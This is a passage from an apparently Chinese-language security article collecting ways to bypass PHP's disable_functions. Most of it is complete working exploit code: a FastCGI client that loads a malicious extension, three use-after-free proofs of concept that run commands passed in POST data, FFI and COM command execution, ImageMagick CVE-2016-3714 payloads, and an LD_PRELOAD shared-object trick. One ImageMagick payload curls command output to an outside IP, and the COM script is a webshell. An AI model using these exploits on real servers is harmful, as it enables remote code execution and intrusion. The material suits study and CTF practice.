                throw new Exception('Role value not known [UNKNOWN_ROLE]');
                break;
            case self::REQUEST_COMPLETE:
                return $response;
        `}`
    `}`
`}`
?&gt;


&lt;?php

/************ config ************/

// your extension directory path
$ext_dir_path = '/tmp/';

// your extension name
$ext_name = 'ant.so';

// unix socket path or tcp host
$connect_path = '127.0.0.1';

// tcp connection port (unix socket: -1)
$port = "9000";

// Don't use this exploit file itself
$filepath = '/var/www/html/index.php';

// your php payload location
$prepend_file_path = '/tmp/1.txt';

/********************************/

$req = '/' . basename($filepath);
$uri = $req;
$client = new FCGIClient($connect_path, $port);

// disable open_basedir and open allow_url_include
$php_value = "allow_url_include = Onnopen_basedir = /nauto_prepend_file = " . $prepend_file_path;
$php_admin_value = "extension_dir=" . $ext_dir_path . "nextension=" . $ext_name;

$params = array(       
        'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',
        'REQUEST_METHOD'    =&gt; 'GET',
        'SCRIPT_FILENAME'   =&gt; $filepath,
        'SCRIPT_NAME'       =&gt; $req,
        'REQUEST_URI'       =&gt; $uri,
        'DOCUMENT_URI'      =&gt; $req,
        'PHP_VALUE'         =&gt; $php_value,
         'PHP_ADMIN_VALUE'   =&gt; $php_admin_value,
        'SERVER_SOFTWARE'   =&gt; 'kaibro-fastcgi-rce',
        'REMOTE_ADDR'       =&gt; '127.0.0.1',
        'REMOTE_PORT'       =&gt; '9985',
        'SERVER_ADDR'       =&gt; '127.0.0.1',
        'SERVER_PORT'       =&gt; '80',
        'SERVER_NAME'       =&gt; 'localhost',
        'SERVER_PROTOCOL'   =&gt; 'HTTP/1.1',
        );

// print_r($_REQUEST);
// print_r($params);

echo "Call: $urinn";
echo $client-&gt;request($params, NULL);
?&gt;
```

[![](https://p4.ssl.qhimg.com/t012774dd5db0926889.png)](https://p4.ssl.qhimg.com/t012774dd5db0926889.png)



## Json Serializer UAF

利用json序列化中的堆溢出触发，借以绕过disable_function，影响范围是:<br>
7.1 – all versions to date<br>
7.2 &lt; 7.2.19 (released: 30 May 2019)<br>
7.3 &lt; 7.3.6 (released: 30 May 2019)

```
&lt;?php

# Author: https://github.com/mm0r1

$cmd = $_POST["pass"];

$n_alloc = 10; # increase this value if you get segfaults

class MySplFixedArray extends SplFixedArray `{`
    public static $leak;
`}`

class Z implements JsonSerializable `{`
    public function write(&amp;$str, $p, $v, $n = 8) `{`
      $i = 0;
      for($i = 0; $i &lt; $n; $i++) `{`
        $str[$p + $i] = chr($v &amp; 0xff);
        $v &gt;&gt;= 8;
      `}`
    `}`

    public function str2ptr(&amp;$str, $p = 0, $s = 8) `{`
        $address = 0;
        for($j = $s-1; $j &gt;= 0; $j--) `{`
            $address &lt;&lt;= 8;
            $address |= ord($str[$p+$j]);
        `}`
        return $address;
    `}`

    public function ptr2str($ptr, $m = 8) `{`
        $out = "";
        for ($i=0; $i &lt; $m; $i++) `{`
            $out .= chr($ptr &amp; 0xff);
            $ptr &gt;&gt;= 8;
        `}`
        return $out;
    `}`

    # unable to leak ro segments
    public function leak1($addr) `{`
        global $spl1;

        $this-&gt;write($this-&gt;abc, 8, $addr - 0x10);
        return strlen(get_class($spl1));
    `}`

    # the real deal
    public function leak2($addr, $p = 0, $s = 8) `{`
        global $spl1, $fake_tbl_off;

        # fake reference zval
        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted
        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval
        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 0x20, 6); # type (string)

        $leak = strlen($spl1::$leak);
        if($s != 8) `{` $leak %= 2 &lt;&lt; ($s * 8) - 1; `}`

        return $leak;
    `}`

    public function parse_elf($base) `{`
        $e_type = $this-&gt;leak2($base, 0x10, 2);

        $e_phoff = $this-&gt;leak2($base, 0x20);
        $e_phentsize = $this-&gt;leak2($base, 0x36, 2);
        $e_phnum = $this-&gt;leak2($base, 0x38, 2);

        for($i = 0; $i &lt; $e_phnum; $i++) `{`
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = $this-&gt;leak2($header, 0, 4);
            $p_flags = $this-&gt;leak2($header, 4, 4);
            $p_vaddr = $this-&gt;leak2($header, 0x10);
            $p_memsz = $this-&gt;leak2($header, 0x28);

            if($p_type == 1 &amp;&amp; $p_flags == 6) `{` # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            `}` else if($p_type == 1 &amp;&amp; $p_flags == 5) `{` # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            `}`
        `}`

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    `}`

    public function get_basic_funcs($base, $elf) `{`
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i &lt; $data_size / 8; $i++) `{`
            $leak = $this-&gt;leak2($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) `{`
                $deref = $this-&gt;leak2($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            `}` else continue;

            $leak = $this-&gt;leak2($data_addr, ($i + 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) `{`
                $deref = $this-&gt;leak2($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            `}` else continue;

            return $data_addr + $i * 8;
        `}`
    `}`

    public function get_binary_base($binary_leak) `{`
        $base = 0;
        $start = $binary_leak &amp; 0xfffffffffffff000;
        for($i = 0; $i &lt; 0x1000; $i++) `{`
            $addr = $start - 0x1000 * $i;
            $leak = $this-&gt;leak2($addr, 0, 7);
            if($leak == 0x10102464c457f) `{` # ELF header
                return $addr;
            `}`
        `}`
    `}`

    public function get_system($basic_funcs) `{`
        $addr = $basic_funcs;
        do `{`
            $f_entry = $this-&gt;leak2($addr);
            $f_name = $this-&gt;leak2($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) `{` # system
                return $this-&gt;leak2($addr + 8);
            `}`
            $addr += 0x20;
        `}` while($f_entry != 0);
        return false;
    `}`

    public function jsonSerialize() `{`
        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;

        $contiguous = [];
        for($i = 0; $i &lt; $n_alloc; $i++)
            $contiguous[] = new DateInterval('PT1S');

        $room = [];
        for($i = 0; $i &lt; $n_alloc; $i++)
            $room[] = new Z();

        $_protector = $this-&gt;ptr2str(0, 78);

        $this-&gt;abc = $this-&gt;ptr2str(0, 79);
        $p = new DateInterval('PT1S');

        unset($y[0]);
        unset($p);

        $protector = ".$_protector";

        $x = new DateInterval('PT1S');
        $x-&gt;d = 0x2000;
        $x-&gt;h = 0xdeadbeef;
        # $this-&gt;abc is now of size 0x2000

        if($this-&gt;str2ptr($this-&gt;abc) != 0xdeadbeef) `{`
            die('UAF failed.');
        `}`

        $spl1 = new MySplFixedArray();
        $spl2 = new MySplFixedArray();

        # some leaks
        $class_entry = $this-&gt;str2ptr($this-&gt;abc, 0x120);
        $handlers = $this-&gt;str2ptr($this-&gt;abc, 0x128);
        $php_heap = $this-&gt;str2ptr($this-&gt;abc, 0x1a8);
        $abc_addr = $php_heap - 0x218;

        # create a fake class_entry
        $fake_obj = $abc_addr;
        $this-&gt;write($this-&gt;abc, 0, 2); # type
        $this-&gt;write($this-&gt;abc, 0x120, $abc_addr); # fake class_entry

        # copy some of class_entry definition
        for($i = 0; $i &lt; 16; $i++) `{`
            $this-&gt;write($this-&gt;abc, 0x10 + $i * 8, 
                $this-&gt;leak1($class_entry + 0x10 + $i * 8));
        `}`

        # fake static members table
        $fake_tbl_off = 0x70 * 4 - 16;
        $this-&gt;write($this-&gt;abc, 0x30, $abc_addr + $fake_tbl_off);
        $this-&gt;write($this-&gt;abc, 0x38, $abc_addr + $fake_tbl_off);

        # fake zval_reference
        $this-&gt;write($this-&gt;abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval
        $this-&gt;write($this-&gt;abc, $fake_tbl_off + 8, 10); # zval type (reference)

        # look for binary base
        $binary_leak = $this-&gt;leak2($handlers + 0x10);
        if(!($base = $this-&gt;get_binary_base($binary_leak))) `{`
            die("Couldn't determine binary base address");
        `}`

        # parse elf header
        if(!($elf = $this-&gt;parse_elf($base))) `{`
            die("Couldn't parse ELF");
        `}`

        # get basic_functions address
        if(!($basic_funcs = $this-&gt;get_basic_funcs($base, $elf))) `{`
            die("Couldn't get basic_functions address");
        `}`

        # find system entry
        if(!($zif_system = $this-&gt;get_system($basic_funcs))) `{`
            die("Couldn't get zif_system address");
        `}`

        # copy hashtable offsetGet bucket
        $fake_bkt_off = 0x70 * 5 - 16;

        $function_data = $this-&gt;str2ptr($this-&gt;abc, 0x50);
        for($i = 0; $i &lt; 4; $i++) `{`
            $this-&gt;write($this-&gt;abc, $fake_bkt_off + $i * 8, 
                $this-&gt;leak2($function_data + 0x40 * 4, $i * 8));
        `}`

        # create a fake bucket
        $fake_bkt_addr = $abc_addr + $fake_bkt_off;
        $this-&gt;write($this-&gt;abc, 0x50, $fake_bkt_addr);
        for($i = 0; $i &lt; 3; $i++) `{`
            $this-&gt;write($this-&gt;abc, 0x58 + $i * 4, 1, 4);
        `}`

        # copy bucket zval
        $function_zval = $this-&gt;str2ptr($this-&gt;abc, $fake_bkt_off);
        for($i = 0; $i &lt; 12; $i++) `{`
            $this-&gt;write($this-&gt;abc,  $fake_bkt_off + 0x70 + $i * 8, 
                $this-&gt;leak2($function_zval, $i * 8));
        `}`

        # pwn
        $this-&gt;write($this-&gt;abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);
        $this-&gt;write($this-&gt;abc, $fake_bkt_off, $fake_bkt_addr + 0x70);

        $spl1-&gt;offsetGet($cmd);

        exit();
    `}`
`}`

$y = [new Z()];
json_encode([&amp;$y]);

```

通过蚁剑或者PHP的file_put_contents写入之后，运行即可执行命令

[![](https://p1.ssl.qhimg.com/t0187e2781bce99e85c.png)](https://p1.ssl.qhimg.com/t0187e2781bce99e85c.png)



## GC UAF

利用的是PHP garbage collector程序中的堆溢出触发，影响范围为7.0-1.3

```
&lt;?php

# Author: https://github.com/mm0r1

pwn($_POST["pass"]);

function pwn($cmd) `{`
    global $abc, $helper;

    function str2ptr(&amp;$str, $p = 0, $s = 8) `{`
        $address = 0;
        for($j = $s-1; $j &gt;= 0; $j--) `{`
            $address &lt;&lt;= 8;
            $address |= ord($str[$p+$j]);
        `}`
        return $address;
    `}`

    function ptr2str($ptr, $m = 8) `{`
        $out = "";
        for ($i=0; $i &lt; $m; $i++) `{`
            $out .= chr($ptr &amp; 0xff);
            $ptr &gt;&gt;= 8;
        `}`
        return $out;
    `}`

    function write(&amp;$str, $p, $v, $n = 8) `{`
        $i = 0;
        for($i = 0; $i &lt; $n; $i++) `{`
            $str[$p + $i] = chr($v &amp; 0xff);
            $v &gt;&gt;= 8;
        `}`
    `}`

    function leak($addr, $p = 0, $s = 8) `{`
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper-&gt;a);
        if($s != 8) `{` $leak %= 2 &lt;&lt; ($s * 8) - 1; `}`
        return $leak;
    `}`

    function parse_elf($base) `{`
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i &lt; $e_phnum; $i++) `{`
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 &amp;&amp; $p_flags == 6) `{` # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            `}` else if($p_type == 1 &amp;&amp; $p_flags == 5) `{` # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            `}`
        `}`

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    `}`

    function get_basic_funcs($base, $elf) `{`
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i &lt; $data_size / 8; $i++) `{`
            $leak = leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) `{`
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            `}` else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) `{`
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            `}` else continue;

            return $data_addr + $i * 8;
        `}`
    `}`

    function get_binary_base($binary_leak) `{`
        $base = 0;
        $start = $binary_leak &amp; 0xfffffffffffff000;
        for($i = 0; $i &lt; 0x1000; $i++) `{`
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) `{` # ELF header
                return $addr;
            `}`
        `}`
    `}`

    function get_system($basic_funcs) `{`
        $addr = $basic_funcs;
        do `{`
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) `{` # system
                return leak($addr + 8);
            `}`
            $addr += 0x20;
        `}` while($f_entry != 0);
        return false;
    `}`

    class ryat `{`
        var $ryat;
        var $chtg;

        function __destruct()
        `{`
            $this-&gt;chtg = $this-&gt;ryat;
            $this-&gt;ryat = 1;
        `}`
    `}`

    class Helper `{`
        public $a, $b, $c, $d;
    `}`

    if(stristr(PHP_OS, 'WIN')) `{`
        die('This PoC is for *nix systems only.');
    `}`

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i &lt; $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);

    $poc = 'a:4:`{`i:0;i:1;i:1;a:1:`{`i:0;O:4:"ryat":2:`{`s:4:"ryat";R:3;s:4:"chtg";i:2;`}``}`i:1;i:3;i:2;R:5;`}`';
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper-&gt;b = function ($x) `{` `}`;

    if(strlen($abc) == 79 || strlen($abc) == 0) `{`
        die("UAF failed");
    `}`

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) `{`
        die("Couldn't determine binary base address");
    `}`

    if(!($elf = parse_elf($base))) `{`
        die("Couldn't parse ELF header");
    `}`

    if(!($basic_funcs = get_basic_funcs($base, $elf))) `{`
        die("Couldn't get basic_functions address");
    `}`

    if(!($zif_system = get_system($basic_funcs))) `{`
        die("Couldn't get zif_system address");
    `}`

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i &lt; 0x110; $i += 8) `{`
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    `}`

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper-&gt;b)($cmd);

    exit();
`}`

```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011f28bfd20763ebc7.png)



## Backtrace UAF

影响版本是7.0-7.4

```
&lt;?php

# Author: https://github.com/mm0r1

pwn($_POST["pass"]);

function pwn($cmd) `{`
    global $abc, $helper, $backtrace;

    class Vuln `{`
        public $a;
        public function __destruct() `{` 
            global $backtrace; 
            unset($this-&gt;a);
            $backtrace = (new Exception)-&gt;getTrace(); # ;)
            if(!isset($backtrace[1]['args'])) `{` # PHP &gt;= 7.4
                $backtrace = debug_backtrace();
            `}`
        `}`
    `}`

    class Helper `{`
        public $a, $b, $c, $d;
    `}`

    function str2ptr(&amp;$str, $p = 0, $s = 8) `{`
        $address = 0;
        for($j = $s-1; $j &gt;= 0; $j--) `{`
            $address &lt;&lt;= 8;
            $address |= ord($str[$p+$j]);
        `}`
        return $address;
    `}`

    function ptr2str($ptr, $m = 8) `{`
        $out = "";
        for ($i=0; $i &lt; $m; $i++) `{`
            $out .= chr($ptr &amp; 0xff);
            $ptr &gt;&gt;= 8;
        `}`
        return $out;
    `}`

    function write(&amp;$str, $p, $v, $n = 8) `{`
        $i = 0;
        for($i = 0; $i &lt; $n; $i++) `{`
            $str[$p + $i] = chr($v &amp; 0xff);
            $v &gt;&gt;= 8;
        `}`
    `}`

    function leak($addr, $p = 0, $s = 8) `{`
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper-&gt;a);
        if($s != 8) `{` $leak %= 2 &lt;&lt; ($s * 8) - 1; `}`
        return $leak;
    `}`

    function parse_elf($base) `{`
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i &lt; $e_phnum; $i++) `{`
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 &amp;&amp; $p_flags == 6) `{` # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            `}` else if($p_type == 1 &amp;&amp; $p_flags == 5) `{` # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            `}`
        `}`

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    `}`

    function get_basic_funcs($base, $elf) `{`
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i &lt; $data_size / 8; $i++) `{`
            $leak = leak($data_addr, $i * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) `{`
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            `}` else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) `{`
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            `}` else continue;

            return $data_addr + $i * 8;
        `}`
    `}`

    function get_binary_base($binary_leak) `{`
        $base = 0;
        $start = $binary_leak &amp; 0xfffffffffffff000;
        for($i = 0; $i &lt; 0x1000; $i++) `{`
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) `{` # ELF header
                return $addr;
            `}`
        `}`
    `}`

    function get_system($basic_funcs) `{`
        $addr = $basic_funcs;
        do `{`
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) `{` # system
                return leak($addr + 8);
            `}`
            $addr += 0x20;
        `}` while($f_entry != 0);
        return false;
    `}`

    function trigger_uaf($arg) `{`
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(str_repeat('A', 79));
        $vuln = new Vuln();
        $vuln-&gt;a = $arg;
    `}`

    if(stristr(PHP_OS, 'WIN')) `{`
        die('This PoC is for *nix systems only.');
    `}`

    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i &lt; $n_alloc; $i++)
        $contiguous[] = str_shuffle(str_repeat('A', 79));

    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];

    $helper = new Helper;
    $helper-&gt;b = function ($x) `{` `}`;

    if(strlen($abc) == 79 || strlen($abc) == 0) `{`
        die("UAF failed");
    `}`

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) `{`
        die("Couldn't determine binary base address");
    `}`

    if(!($elf = parse_elf($base))) `{`
        die("Couldn't parse ELF header");
    `}`

    if(!($basic_funcs = get_basic_funcs($base, $elf))) `{`
        die("Couldn't get basic_functions address");
    `}`

    if(!($zif_system = get_system($basic_funcs))) `{`
        die("Couldn't get zif_system address");
    `}`

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i &lt; 0x110; $i += 8) `{`
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    `}`

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper-&gt;b)($cmd);
    exit();
`}`

```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01aef58204226231fa.png)



## FFI扩展

php&gt;7.4，开启了FFI扩展ffi.enable=true，我们可以通过FFI来调用C中的system进而达到执行命令的目的

```
&lt;?php
$ffi = FFI::cdef("int system(const char *command);");
$ffi-&gt;system("whoami &gt;/tmp/1");
echo file_get_contents("/tmp/1");
@unlink("/tmp/1");
?&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01e83fc95cbbcb84ab.png)



## ImageMagick

imagemagick是一个用于处理图片的程序，如果上传的图片含有攻击代码，在处理时可被远程执行任意代码（CVE-2016–3714）

[![](https://p4.ssl.qhimg.com/t01d74bea0e06694d57.png)](https://p4.ssl.qhimg.com/t01d74bea0e06694d57.png)

题目环境：[https://github.com/Medicean/VulApps/tree/master/i/imagemagick/1](https://github.com/Medicean/VulApps/tree/master/i/imagemagick/1)

poc.png

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://test.com/"|whoami")'
pop graphic-context
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t015cbe828730decc31.png)

exp.php

```
&lt;?php
echo "Disable Functions: " . ini_get('disable_functions') . "n";

$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];
if ($command == '') `{`
    $command = 'curl xx.xx.xx.xx:9962/`whoami`';
`}`

$exploit = &lt;&lt;&lt;EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|$command")'
pop graphic-context
EOF;

file_put_contents("test.mvg", $exploit);
$thumb = new Imagick();
$thumb-&gt;readImage('test.mvg');
$thumb-&gt;writeImage('test.png');
$thumb-&gt;clear();
$thumb-&gt;destroy();
unlink("test.mvg");
unlink("test.png");
?&gt;
```

[![](https://p1.ssl.qhimg.com/t01bea59dbd97983f96.png)](https://p1.ssl.qhimg.com/t01bea59dbd97983f96.png)

另外，利用putenv+Imagick bypass disable_function，TCTF Wallbreaker_Easy

[![](https://p0.ssl.qhimg.com/t01b0600bdcc5f58df9.png)](https://p0.ssl.qhimg.com/t01b0600bdcc5f58df9.png)

test.c

```
#define _GNU_SOURCE                                   
#include &lt;stdlib.h&gt;                                   
#include &lt;unistd.h&gt;                                   
#include &lt;sys/types.h&gt;                                

__attribute__ ((__constructor__)) void angel (void)`{`  
    unsetenv("LD_PRELOAD");                           
    system("id &gt; /tmp/79e3f0b59df431154c088db7e45ebe6b/id");                          
`}`
```

生成exploit.so使用copy上传，再上传test.mov

```
gcc -c -fPIC test.c -o exploit &amp;&amp; gcc --share exploit -o exploit.so
```

利用Imagick启用新的子进程，执行：

```
backdoor=putenv("LD_PRELOAD=/tmp/79e3f0b59df431154c088db7e45ebe6b/exploit.so");
$mov = new Imagick("/tmp/79e3f0b59df431154c088db7e45ebe6b/test.mov");
```

读取执行命令后的内容

```
backdoor=readfile("/tmp/79e3f0b59df431154c088db7e45ebe6b/id");
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t010aba86bc5e8a37b1.png)



## COM组件

window下的组件，开启组件（php5.4以上），开启com.allow_dcom = true，添加extension=php_com_dotnet.dll

[![](https://p2.ssl.qhimg.com/t016572d83c0b1c6b1b.png)](https://p2.ssl.qhimg.com/t016572d83c0b1c6b1b.png)

exp.php

```
&lt;?php
$command = $_GET['cmd'];
$wsh = new COM('WScript.shell'); // 生成一个COM对象　Shell.Application也能
$exec = $wsh-&gt;exec("cmd /c".$command); //调用对象方法来执行命令
$stdout = $exec-&gt;StdOut();
$stroutput = $stdout-&gt;ReadAll();
echo $stroutput;
?&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015b8fbdfc698b5a6d.png)



## 参考

[https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD)<br>[https://evi1.cn/post/bypass_disable_func/](https://evi1.cn/post/bypass_disable_func/)<br>[https://www.anquanke.com/post/id/195686#h3-3](https://www.anquanke.com/post/id/195686#h3-3)<br>[https://github.com/l3m0n/Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)<br>[https://github.com/mm0r1/exploits](https://github.com/mm0r1/exploits)<br>[https://github.com/AntSwordProject/ant_php_extension](https://github.com/AntSwordProject/ant_php_extension)<br>[https://github.com/w181496/FuckFastcgi/blob/master/index.php](https://github.com/w181496/FuckFastcgi/blob/master/index.php)<br>[https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/](https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/)
